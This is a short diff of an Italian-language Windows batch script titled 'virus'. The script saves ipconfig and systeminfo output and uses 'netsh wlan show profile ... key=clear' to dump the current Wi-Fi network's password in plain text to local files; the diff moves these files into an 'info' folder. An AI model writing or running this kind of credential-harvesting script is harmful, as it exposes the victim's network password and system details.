@@ -1,12 +1,13 @@
 @echo off
 title virus
 color 0A
+mkdir info
 md info
-ipconfig> %userprofile%\downloads\test_download\file_bat\inderizzo.txt
-systeminfo> %userprofile%\downloads\test_download\file_bat\infoutente.txt
+ipconfig> %userprofile%\downloads\test_download\file_bat\info\inderizzo.txt
+systeminfo> %userprofile%\downloads\test_download\file_bat\info\infoutente.txt
 for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr "SSID" ^| findstr /v "BSSID"') do set SSID=%%i
 set SSID=%SSID:~1%
-netsh wlan show profile name="%SSID%" key=clear> %userprofile%\downloads\test_download\file_bat\wifi.txt
+netsh wlan show profile name="%SSID%" key=clear> %userprofile%\downloads\test_download\file_bat\info\wifi.txt
 set /p nome=come ti chiami:
 echo %nome% qui trovi la tua versione del tuo pc
 ver
